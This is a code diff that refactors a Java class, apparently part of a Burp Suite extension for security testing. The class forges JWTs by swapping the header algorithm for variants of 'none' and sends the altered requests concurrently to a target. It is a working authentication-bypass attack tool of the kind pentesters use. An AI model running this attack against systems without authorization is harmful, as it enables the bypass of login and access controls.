@@ -5,7 +5,6 @@ import java.util.HashMap;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 import java.util.function.BiConsumer;
-import java.util.function.BiFunction;
 
 import org.json.JSONObject;
 
@@ -27,12 +26,20 @@ public class NoneAlgorithmAttacker implements IAttacker {
      * @param callback - The callback to run on the response of each payload request.
      */
     public void startAttack(BiConsumer<String, IHttpRequestResponse> callback) {
+        byte[] baseRequest = target.getRequest();
+        String extractedJWT = Utils.extractJWT(target.getJwt());
+
+        if (extractedJWT == null) {
+            callbacks.printError(Constants.INVALID_JWT_EXCEPTION_MESSAGE);
+            return;
+        }
+
         ExecutorService executor = threads > 0
                                         ? Executors.newScheduledThreadPool(threads)
                                         : Executors.newCachedThreadPool();
-        HashMap<String, byte[]> payloadRequests = getPayloadRequests(target.getRequest(), target.getJwt());
+        HashMap<String, byte[]> attackRequests = buildAttackRequests(baseRequest, extractedJWT);
 
-        payloadRequests.forEach((payload, request) ->
+        attackRequests.forEach((payload, request) ->
             executor.execute(() -> {
                 IHttpRequestResponse requestResponse = callbacks.makeHttpRequest(target.getHttpService(), request);
                 callback.accept(payload, requestResponse);
@@ -46,23 +53,21 @@ public class NoneAlgorithmAttacker implements IAttacker {
      * Builds a map of payload requests for the given HTTP request.
      * The key points to the payload used to modify the JWT.
      * The value points to the request carrying the payload.
-     * @param requestBytes - The HTTP request.
+     * @param request - The HTTP request.
      * @param jwt - The actual JWT obtained from the request.
      * @return The map of payload requests.
      */
-    public HashMap<String, byte[]> getPayloadRequests(byte[] requestBytes, String jwt) {
-        String request = new String(requestBytes);
-        HashMap<String, byte[]> payloadRequestMap = new HashMap<>();
-        try {
-            HashMap<String, String> payloadMap = Utils.generatePayloadMap(jwt, Constants.NONE_WORD_LIST, generatePayload);
+    public HashMap<String, byte[]> buildAttackRequests(byte[] request, String jwt) {
+        HashMap<String, byte[]> attackRequests = new HashMap<>();
 
-            payloadMap.forEach((payloadKey, payloadValue) ->
-                payloadRequestMap.put(payloadKey, request.replaceAll(jwt, payloadValue).getBytes()));
-            } catch (Exception e) {
-                callbacks.printError(e.getMessage());
-            }
+        Constants.NONE_WORD_LIST.forEach(word -> {
+            String payload = buildPayload(jwt, word);
+            String attackRequest = new String(request).replaceAll(jwt, payload);
 
-            return payloadRequestMap;
+            attackRequests.put(word, attackRequest.getBytes());
+        });
+
+        return attackRequests;
     }
 
     /**
@@ -72,7 +77,7 @@ public class NoneAlgorithmAttacker implements IAttacker {
      * @param algorithm - The algorithm to be replaced with.
      * @return The modified JWT string.
      */
-    private BiFunction<String, String, String> generatePayload = (String jwt, String algorithm) -> {
+    private String buildPayload(String jwt, String algorithm) {
         String[] jwtSplitArray = jwt.split("\\.");
         String encodedHeader = jwtSplitArray[0];
         String decodedHeader = new String(Base64.getDecoder().decode(encodedHeader));
@@ -84,8 +89,7 @@ public class NoneAlgorithmAttacker implements IAttacker {
         // in the Base64 encoding must be removed in order to consider it a valid JWT.
         // See https://www.ietf.org/archive/id/draft-jones-json-web-token-02.html#base64urllogic
         jwtSplitArray[0] = replacedHeader.replaceAll("=", "");
-        String newJWT = String.join(".", jwtSplitArray);
 
-        return newJWT;
-    };
+        return String.join(".", jwtSplitArray);
+    }
 }
